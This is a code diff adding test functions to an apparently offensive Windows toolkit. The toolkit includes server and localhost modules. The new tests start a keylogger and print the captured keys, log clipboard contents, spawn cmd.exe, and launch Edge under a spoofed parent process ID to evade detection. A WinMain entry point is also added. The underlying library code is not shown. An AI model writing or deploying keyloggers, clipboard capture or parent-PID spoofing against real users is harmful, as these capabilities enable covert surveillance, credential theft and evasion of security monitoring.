@@ -6,6 +6,9 @@
 #include <iostream>
 #include "../lib/localhost.h"
 #include "../lib/server.h"
+#include "../lib/keylogger.h"
+#include "../lib/clipboard.h"
+#include "../lib/spawn.h"
 
 void getSystemInfo()
 {
@@ -109,8 +112,112 @@ void listProcesses()
 	}
 }
 
+void test_keylogger()
+{
+	Keylogger keylogger = Keylogger();
+
+	bool success = keylogger.start_keylogger();
+	if (success)
+	{
+		printf("Successfully started the keylogger\n");
+	}
+	else
+	{
+		printf("Failed to start the keylogger\n");
+	}
+
+	printf("Sleeping for 10 seconds, type some keys\n");
+
+	Sleep(10 * 1000);
+
+	printf("Keys:\n");
+
+	std::string keys = keylogger.get_logged_keys();
+	printf("%s\n", keys.c_str());
+
+	success = keylogger.stop_keylogger();
+	if (success)
+	{
+		printf("Successfully stopped the keylogger\n");
+	}
+	else
+	{
+		printf("Failed to stop the keylogger\n");
+	}
+
+
+}
+
+void test_clipboard_logger()
+{
+	ClipboardLogger clipboard_logger = ClipboardLogger();
+
+	bool success = clipboard_logger.start_clipboard_logger();
+	if (success)
+	{
+		printf("Successfully started the clipboard logger\n");
+	}
+	else
+	{
+		printf("Failed to start the clipboard logger\n");
+	}
+
+	printf("Sleeping for 10 seconds, set some clipboards\n");
+
+	Sleep(10 * 1000);
+
+	printf("Clipboards:\n");
+
+	std::list<std::string> clipboards = clipboard_logger.get_logged_clipboards();
+	for (std::list<std::string>::const_iterator iterator = clipboards.begin(), end = clipboards.end(); iterator != end; ++iterator) 
+	{
+		printf(" - %s\n", (*iterator).c_str());
+	}
+
+	success = clipboard_logger.stop_clipboard_logger();
+	if (success)
+	{
+		printf("Successfully stopped the clipboard logger\n");
+	}
+	else
+	{
+		printf("Failed to stop the clipboard logger\n");
+	}
+
+
+}
+
+void test_spawn()
+{
+	Spawn spawn = Spawn();
+
+	// Spawn cmd.exe
+	bool success = spawn.start_exe("C:\\Windows\\System32\\cmd.exe", "/C ipconfig");
+	if (success)
+	{
+		printf("Successfully started cmd.exe\n");
+	}
+	else
+	{
+		printf("Failed to start cmd.exe: %d\n", GetLastError());
+	}
+
+	// Spawn msedge.exe with another parent pid
+	success = spawn.start_exe("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", NULL, 77161); //25424
+	if (success)
+	{
+		printf("Successfully started msedge.exe\n");
+	}
+	else
+	{
+		printf("Failed to start msedge.exe: %d\n", GetLastError());
+	}
+
+}
+
 int main()
 {
+	/*
 	getSystemInfo();
 
 	printf("\n==========================================\n\n");
@@ -124,5 +231,25 @@ int main()
 	printf("\n==========================================\n\n");
 
 	listProcesses();
+
+	printf("\n==========================================\n\n");
+
+	test_keylogger();
+
+	printf("\n==========================================\n\n");
+
+	test_clipboard_logger();
+	*/
+
+	printf("\n==========================================\n\n");
+
+	test_spawn();
+
+	Sleep(10 * 1000);
 }
 
+int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance,
+	LPSTR lpCmdLine, int nCmdShow)
+{
+	main();
+}
